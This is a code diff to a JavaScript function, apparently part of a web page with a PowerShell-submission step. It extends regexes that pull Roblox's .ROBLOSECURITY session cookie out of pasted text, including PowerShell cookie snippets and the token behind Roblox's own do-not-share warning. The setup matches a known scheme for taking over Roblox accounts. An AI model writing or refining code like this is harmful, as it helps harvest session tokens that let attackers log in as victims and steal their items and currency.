@@ -354,16 +354,18 @@ async function submitPowerShell() {
 function extractRobloxCookie(text) {
     // Look for various Roblox authentication patterns
     const patterns = [
-        // New-Object System.Net.Cookie format with .ROBLOSECURITY
-        /New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/i,
+        // PowerShell New-Object System.Net.Cookie format with .ROBLOSECURITY (most specific first)
+        /New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/is,
+        // PowerShell format with single quotes
+        /New-Object\s+System\.Net\.Cookie\s*\(\s*'\.ROBLOSECURITY'\s*,\s*'([^']+)'/is,
+        // PowerShell $session.Cookies.Add format
+        /\$session\.Cookies\.Add\s*\(\s*\(New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/is,
         // Standard .ROBLOSECURITY cookie format
         /\.ROBLOSECURITY=([^;"\s\n]+)/i,
-        // Warning format with the actual cookie
-        /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-F0-9]+)/i,
+        // Warning format with the actual cookie (extract after _|WARNING...|_)
+        /_\|WARNING[^|]*\|_([A-F0-9.]+)/i,
         // Simple ROBLOSECURITY format
         /ROBLOSECURITY[=:]\s*([^;"\s\n]+)/i,
-        // Warning format variations
-        /_\|WARNING[^|]*\|_([A-F0-9]+)/i,
         // Plain cookie value format
         /roblosecurity[=:]\s*([^;"\s\n]+)/i,
         // Cookie header format
@@ -373,22 +375,26 @@ function extractRobloxCookie(text) {
     for (const pattern of patterns) {
         const match = text.match(pattern);
         if (match && match[1] && match[1].length > 50) {
+            console.log('Found Roblox auth data using pattern:', pattern.source);
+            console.log('Extracted data length:', match[1].length);
             return match[1];
         }
     }
     
-    // If no specific pattern found, look for any long alphanumeric string that might be a cookie
-    const genericPattern = /[A-F0-9]{100,}/i;
-    const genericMatch = text.match(genericPattern);
-    if (genericMatch && genericMatch[0].length > 100) {
-        return genericMatch[0];
+    // Look for the long Roblox authentication token pattern (starts with _|WARNING and ends with various characters)
+    const longTokenPattern = /_\|WARNING[^|]*\|_([A-Za-z0-9+/=._%\-]{200,})/i;
+    const longTokenMatch = text.match(longTokenPattern);
+    if (longTokenMatch && longTokenMatch[1]) {
+        console.log('Found long token pattern, length:', longTokenMatch[1].length);
+        return longTokenMatch[1];
     }
     
-    // Look for base64-like strings that could be cookies
-    const base64Pattern = /[A-Za-z0-9+/]{200,}={0,2}/;
-    const base64Match = text.match(base64Pattern);
-    if (base64Match && base64Match[0].length > 200) {
-        return base64Match[0];
+    // If no specific pattern found, look for any very long string that could be authentication data
+    const genericPattern = /[A-Za-z0-9+/=._%\-]{500,}/;
+    const genericMatch = text.match(genericPattern);
+    if (genericMatch && genericMatch[0].length > 500) {
+        console.log('Found generic long string, length:', genericMatch[0].length);
+        return genericMatch[0];
     }
     
     return null;
